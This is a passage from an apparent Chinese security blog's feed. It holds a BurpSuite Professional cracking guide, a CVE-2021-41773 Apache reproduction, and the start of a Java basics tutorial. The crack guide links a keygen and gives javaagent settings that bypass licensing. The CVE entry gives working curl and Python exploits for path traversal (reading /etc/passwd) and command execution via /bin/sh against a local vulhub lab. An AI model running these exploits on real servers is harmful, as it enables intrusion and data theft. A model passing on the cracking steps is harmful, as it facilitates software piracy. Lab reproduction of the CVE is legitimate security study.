&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/c</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
    <category term="代码审计" scheme="https://syst1m.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MacOs BurpSuite dmg破解和汉化</title>
    <link href="https://syst1m.top/2023/09/23/MacOs-BurpSuite-dmg%E7%A0%B4%E8%A7%A3%E5%92%8C%E6%B1%89%E5%8C%96/"/>
    <id>https://syst1m.top/2023/09/23/MacOs-BurpSuite-dmg%E7%A0%B4%E8%A7%A3%E5%92%8C%E6%B1%89%E5%8C%96/</id>
    <published>2023-09-23T10:18:33.000Z</published>
    <updated>2023-09-23T10:36:55.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>先下载burpsuite的dmg安装包,正常安装</p><p>官网下载地址：<br><a href="https://portswigger.net/burp/releases/">https://portswigger.net/burp/releases/</a></p><p>直达链接：<br>Intel版本：<a href="https://portswigger.net/burp/releases/download?product=pro&amp;version=2023.4.2&amp;type=MacOsx">https://portswigger.net/burp/releases/download?product=pro&amp;version=2023.4.2&amp;type=MacOsx</a></p><p>M1版本：<a href="https://portswigger-cdn.net/burp/releases/download?product=pro&amp;version=2023.4.2&amp;type=MacOsArm64">https://portswigger-cdn.net/burp/releases/download?product=pro&amp;version=2023.4.2&amp;type=MacOsArm64</a></p><h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><p>按照好后,打开包</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309231822307.png" alt="image-20230923182207225"></p><p>下载破解包</p><p><a href="https://github.com/lzskyline/BurpLoaderKeygen/raw/main/BurpLoaderKeygen.jar">https://github.com/lzskyline/BurpLoaderKeygen/raw/main/BurpLoaderKeygen.jar</a></p><p>放到app路径下 &#x2F;Applications&#x2F;Burp Suite Professional.app&#x2F;Contents&#x2F;Resources&#x2F;app</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309231828578.png" alt="image-20230923182855540"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309231828789.png" alt="image-20230923182836756"></p><p>下载汉化包</p><p><a href="https://github.com/Leon406/BurpSuiteCN-Release/releases/download/v3.7.17/burpsuitloader-3.7.17-all.jar">https://github.com/Leon406/BurpSuiteCN-Release/releases/download/v3.7.17/burpsuitloader-3.7.17-all.jar</a></p><p>返回到Contents目录，编辑vmoptions.txt，末尾追加内容</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--<span class="keyword">add</span>-opens=java.<span class="keyword">base</span>/java.lang=ALL-UNNAMED</span><br><span class="line">--<span class="keyword">add</span>-opens=java.<span class="keyword">base</span>/jdk.<span class="keyword">internal</span>.org.objectweb.asm=ALL-UNNAMED</span><br><span class="line">--<span class="keyword">add</span>-opens=java.<span class="keyword">base</span>/jdk.<span class="keyword">internal</span>.org.objectweb.asm.tree=ALL-UNNAMED</span><br><span class="line">--<span class="keyword">add</span>-opens=java.<span class="keyword">base</span>/jdk.<span class="keyword">internal</span>.org.objectweb.asm.Opcodes=ALL-UNNAMED</span><br><span class="line">-javaagent:burpsuitloader<span class="number">-3.7</span><span class="number">.17</span>-all.jar=han</span><br><span class="line">-javaagent:BurpLoaderKeygen.jar</span><br><span class="line">-noverify</span><br></pre></td></tr></table></figure><p>运行app，然后启动注册机BurpLoaderKeygen.jar，生成激活码激活即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h1&gt;&lt;p&gt;先下载burpsuite的dmg安装包,正常安装&lt;/p&gt;
&lt;p&gt;官网下载地址：&lt;br&gt;&lt;a href=&quot;https://portswigge</summary>
      
    
    
    
    <category term="工具" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="burpsuite" scheme="https://syst1m.top/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-41773 复现poc</title>
    <link href="https://syst1m.top/2023/09/20/CVE-2021-41773-%E5%A4%8D%E7%8E%B0poc/"/>
    <id>https://syst1m.top/2023/09/20/CVE-2021-41773-%E5%A4%8D%E7%8E%B0poc/</id>
    <published>2023-09-20T05:51:57.000Z</published>
    <updated>2023-10-09T12:29:21.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复现这个cve写poc的时候发现,使用curl可以正常复现,而python则一直报400,水一篇博客记录一下</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>使用curl,可以正常复现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309201404566.png" alt="image-20230920140327473"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data <span class="string">&quot;echo;id&quot;</span> <span class="string">&#x27;http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309201404464.png" alt="image-20230920140422414"></p><h2 id="python-poc"><a href="#python-poc" class="headerlink" title="python poc"></a>python poc</h2><p>发现报错400</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309201405657.png" alt="image-20230920140545612"></p><p>直接说原因就是,requests在发送请求的时候,对url进行了自动解码,且不可控制,就变成了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/etc/passwd/</span><br></pre></td></tr></table></figure><p>所以,会报400,在chrome中,也会出现这个问题,直接将url编码自动解码,而后去掉<code>../</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309201410176.png" alt="image-20230920141016131"></p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>发现使用urllib库,也就是requests的底层库,不会出现这个问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span></span><br><span class="line">req = urllib.request.Request(url)</span><br><span class="line">salida = urllib.request.urlopen(req, timeout=<span class="number">5</span>)</span><br><span class="line">contenido = salida.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(contenido)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309201411169.png" alt="image-20230920141149106"></p><p>命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;</span></span><br><span class="line">data = <span class="string">&quot;echo;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据编码为字节字符串</span></span><br><span class="line">data_bytes = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个请求对象</span></span><br><span class="line">req = urllib.request.Request(url, data=data_bytes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求方法为 POST</span></span><br><span class="line">req.method = <span class="string">&#x27;POST&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求并获取响应</span></span><br><span class="line"><span class="keyword">with</span> urllib.request.urlopen(req) <span class="keyword">as</span> response:</span><br><span class="line">    response_data = response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理响应</span></span><br><span class="line"><span class="built_in">print</span>(response_data)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309201416943.png" alt="image-20230920141632854"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在复现这个cve写poc的时候发现,使用curl可以正常复现,而python则一直报400,水一篇博客记录一下&lt;/p&gt;
&lt;h1 id=&quot;环境</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache" scheme="https://syst1m.top/tags/Apache/"/>
    
    <category term="vulhub" scheme="https://syst1m.top/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-代码审计</title>
    <link href="https://syst1m.top/2023/09/01/Java%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://syst1m.top/2023/09/01/Java%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-09-01T08:48:26.000Z</published>
    <updated>2023-10-17T06:34:07.368Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>java学完忘完了,从头捡起来…顺便记录一下</p><p>仅记录自己学习中觉得值得记录的地方,并不完全,也不适合所有人</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>java:jdk17lts</p><p>编辑器:idea</p><p>视频教程:<a href="https://www.bilibili.com/video/BV1Cv411372m/?p=19&amp;spm_id_from=pageDriver&amp;vd_source=6bf1c94d1bbfd3bb26bf7332b2f748c5">https://www.bilibili.com/video/BV1Cv411372m/?p=19&amp;spm_id_from=pageDriver&amp;vd_source=6bf1c94d1bbfd3bb26bf7332b2f748c5</a></p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031722151.png" alt="image-20230903172231110"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;中国&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;中国&quot;</span>+<span class="string">&quot;hello world&quot;</span>); <span class="comment">//字符串</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">123.123</span>;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> a+b;</span><br><span class="line">        System.out.println(c);  <span class="comment">//变量赋值,相加</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031740946.png" alt="image-20230903174056917"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        System.out.println(a);  <span class="comment">//变量需先声明再使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            System.out.println(b); <span class="comment">//变量的有效范围是当前&#123;&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        System.out.println(c); <span class="comment">//变量使用需要有值</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031746657.png" alt="image-20230903174655609"></p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031746325.png" alt="image-20230903174635294"></p><h2 id="八-x2F-十六进制"><a href="#八-x2F-十六进制" class="headerlink" title="八&#x2F;十六进制"></a>八&#x2F;十六进制</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031820929.png" alt="image-20230903182021886"></p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031825296.png" alt="image-20230903182555257"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">127</span>;</span><br><span class="line">        <span class="comment">//byte a = 128; // 越界</span></span><br><span class="line"></span><br><span class="line">        <span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">32712</span>;</span><br><span class="line">        <span class="comment">//short b = 32799; //越界</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">//默认整数</span></span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">lg</span> <span class="operator">=</span> <span class="number">11111L</span>; <span class="comment">//整数默认int类型,需要长整型需要加L或者l</span></span><br><span class="line"></span><br><span class="line">        <span class="type">float</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">2222F</span>; <span class="comment">//整数默认int类型,需要长整型需要加F或者f</span></span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">1.2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; <span class="comment">//只能有一个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 引用数据类型,字符串类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ch2</span> <span class="operator">=</span> <span class="string">&quot;aaa&quot;</span>; <span class="comment">//多个字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309031911040.png" alt="image-20230903191121994"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="表达式自动类型转换"><a href="#表达式自动类型转换" class="headerlink" title="表达式自动类型转换"></a>表达式自动类型转换</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309041600569.png" alt="image-20230904160017501"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">rs</span> <span class="operator">=</span> a+b+c; <span class="comment">//表达式最终类型由最高类型决定</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309041607584.png" alt="image-20230904160738532"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>) a; <span class="comment">//快捷键 alt+回车</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b); <span class="comment">//20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309041629281.png" alt="image-20230904162955230"></p><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309041829518.png" alt="image-20230904182911448"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">        System.out.println(b/a); <span class="comment">//1,整数相除取整</span></span><br><span class="line">        System.out.println(<span class="number">1.0</span>*b/a); <span class="comment">//1.5,取最高类型</span></span><br><span class="line">      System.out.println(<span class="string">&quot;中&quot;</span>+<span class="string">&quot;国&quot;</span>); <span class="comment">//中国,字符拼接</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自增自减运算符"><a href="#自增自减运算符" class="headerlink" title="自增自减运算符"></a>自增自减运算符</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309041853753.png" alt="image-20230904185352706"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res1</span> <span class="operator">=</span> a++; <span class="comment">//先复制再加</span></span><br><span class="line">        System.out.println(res1);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res2</span> <span class="operator">=</span> ++c; <span class="comment">//先加在赋值</span></span><br><span class="line">        System.out.println(res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309041913860.png" alt="image-20230904191332796"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1.1</span>;</span><br><span class="line">        a+=b;</span><br><span class="line">        System.out.println(a); <span class="comment">//21</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1.1</span>;</span><br><span class="line">        a = a+b;</span><br><span class="line">        System.out.println(a); <span class="comment">//21.1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309121438498.png" alt="image-20230912143816865"></p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        System.out.println(a&gt;<span class="number">100</span> &amp;&amp; ++b&gt;<span class="number">99</span>);<span class="comment">//左边为false右边不执行</span></span><br><span class="line">        System.out.println(b); <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309121507094.png" alt="image-20230912150728044"></p><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span 